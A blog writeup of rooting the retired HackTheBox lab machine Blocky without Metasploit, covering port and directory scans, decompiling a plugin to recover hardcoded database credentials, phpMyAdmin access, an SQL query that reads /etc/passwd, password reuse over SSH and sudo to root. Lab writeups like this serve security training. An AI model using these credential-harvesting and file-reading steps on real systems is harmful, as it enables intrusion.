---
layout: post
title: "Writeup: HackTheBox Blocky - NO Metasploit"
description: "Rooting Blocky without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Blocky

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.37</small>_

The initial port scan identifies this as a Minecraft server with some kind of web server running on it.
A lot of interesting ports to throw you down rabbit holes.

```bash
sudo nmap -sS -T4 -p- 10.10.10.37

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 15:53 EDT
Nmap scan report for 10.10.10.37
Host is up (0.015s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```

```bash
sudo nmap -T4 -p 21,22,80,8192,25565 -A 10.10.10.37

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 15:56 EDT
Nmap scan report for 10.10.10.37
Host is up (0.014s latency).

PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Device type: general purpose|WAP|specialized|storage-misc|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (89%), HP embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%)                                                                                                                
No exact OS matches for host (test conditions non-ideal).                                                         
Network Distance: 2 hops                                                                                          
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                    
                                                                                                                  
TRACEROUTE (using port 8192/tcp)                                                                                  
HOP RTT      ADDRESS                                                                                              
1   13.83 ms 10.10.14.1                                                                                           
2   13.89 ms 10.10.10.37 
```

Notably:

- A Wordpress blog is running on `tcp/80`
- FTP is exposed on this machine, running ProFTPD 1.3.5a
- Minecraft server on `tcp/25565` running version 1.11.2

I did not save the [gobuster][] command I ran for this server, but the output was:

```
/.hta (Status: 403) [Size: 290]
/.hta.txt (Status: 403) [Size: 294]
/.hta.html (Status: 403) [Size: 295]
/.hta.php (Status: 403) [Size: 294]
/.hta.asp (Status: 403) [Size: 294]
/.hta.aspx (Status: 403) [Size: 295]
/.hta.jsp (Status: 403) [Size: 294]
/.htpasswd (Status: 403) [Size: 295]
/.htpasswd.html (Status: 403) [Size: 300]
/.htaccess (Status: 403) [Size: 295]
/.htpasswd.php (Status: 403) [Size: 299]
/.htaccess.jsp (Status: 403) [Size: 299]
/.htpasswd.asp (Status: 403) [Size: 299]
/.htaccess.txt (Status: 403) [Size: 299]
/.htpasswd.aspx (Status: 403) [Size: 300]
/.htaccess.html (Status: 403) [Size: 300]
/.htpasswd.jsp (Status: 403) [Size: 299]
/.htaccess.php (Status: 403) [Size: 299]
/.htaccess.asp (Status: 403) [Size: 299]
/.htpasswd.txt (Status: 403) [Size: 299]
/.htaccess.aspx (Status: 403) [Size: 300]
/index.php (Status: 301) [Size: 0]
/index.php (Status: 301) [Size: 0]
/javascript (Status: 301) [Size: 315]
/license.txt (Status: 200) [Size: 19935]
/phpmyadmin (Status: 301) [Size: 315]
/plugins (Status: 301) [Size: 312]
/readme.html (Status: 200) [Size: 7413]
/server-status (Status: 403) [Size: 299]
/wiki (Status: 301) [Size: 309]
/wp-admin (Status: 301) [Size: 313]
/wp-blog-header.php (Status: 200) [Size: 0]
/wp-content (Status: 301) [Size: 315]
/wp-cron.php (Status: 200) [Size: 0]
/wp-config.php (Status: 200) [Size: 0]
/wp-includes (Status: 301) [Size: 316]
/wp-links-opml.php (Status: 200) [Size: 219]
/wp-load.php (Status: 200) [Size: 0]
/wp-login.php (Status: 200) [Size: 2402]
/wp-mail.php (Status: 403) [Size: 3444]
/wp-signup.php (Status: 302) [Size: 0]
/wp-trackback.php (Status: 200) [Size: 135]
```

Let's look through the various Wordpress endpoints and see if anything interesting pops out.

`http://10.10.10.37/wp-admin/install.php` shows me that they have already completed setting up the Wordpress server, so nothing there.

`http://10.10.10.37/plugins/` shows me two plugins are installed:

- `BlockyCore.jar`
- `griefprevention-1.11.2-3.1.1.298.jar`

I download both plugins and use [jd-gui][] to decompile them.
`griefprevention` seems to be a 3rd party, standard plugin.
`BlockyCore` looks like a custom plugin, however.

I find some database credentials!

![blockycore decompiled][]

```java
public String sqlHost = "localhost";
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

Since these are database credentials, I can likely log into [PHPMyAdmin][] with them.
Indeed, I am successful on `http://10.10.10.37/phpmyadmin` with the credentials `root / 8YsqfCTnvxAUeduzjNSXe22`.

Now, there is a lot I can try out with access to the server's databases.

I can gather information on the technology running and look for exploits.

```
Apache/2.4.18 (Ubuntu)
Database client version: libmysql - mysqlnd 5.0.12-dev - 20150407 - $Id: b5c5906d452ec590732a93b051f3827e02749b83 $
PHP extension: mysqli Documentation
PHP version: 7.0.18-0ubuntu0.16.04.1
PHPMyAdmin: Version information: 4.5.4.1deb2ubuntu2

Database:
Server: Localhost via UNIX socket
Server type: MySQL
Server version: 5.7.18-0ubuntu0.16.04.1 - (Ubuntu)
Protocol version: 10
User: root@localhost
Server charset: UTF-8 Unicode (utf8)
```

I can look for a `users` table in one of the databases and try to crack passwords.
In the `wordpress` database, there is a `Notch` user with the hash `$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`.

I can also read data off the file system.

```sql
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
SELECT * FROM `test`;
```

![passwd from sql][]

But, let's keep things simple. I see from the `wordpress` table that the user is `notch`.
I found a password in `public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";`.
I have an open SSH port.
Let's give it a try.

```bash
ssh notch@10.10.10.37
```

Using the discovered `sqlPass` password, I am able to SSH onto the box as the `notch` user.
I can collect the user flag.
From here, I always like to check my `sudo` permissions before doing anything else.

```bash
notch@Blocky:~/minecraft/config$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Well then! I can do whatever I want on the system.
I can use `sudo -i` to gain a root shell.

```bash
notch@Blocky:~/minecraft/config$ sudo -i
root@Blocky:~# whoami
root
```

The [`-i` flag][sudo i]:

> runs the shell specified by the password database entry of the target user as a login shell.
> If no command is specified, an interactive shell is executed.

We can now collect the root flag.

[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu
[jd-gui]: https://tools.kali.org/reverse-engineering/jd-gui
[sudo i]: https://linux.die.net/man/8/sudo

[blockycore decompiled]: /assets/img/htb/blocky/sql-creds-decompiled-jar.png
[passwd from sql]: /assets/img/htb/blocky/phpmyadmin-etc-passwd.png
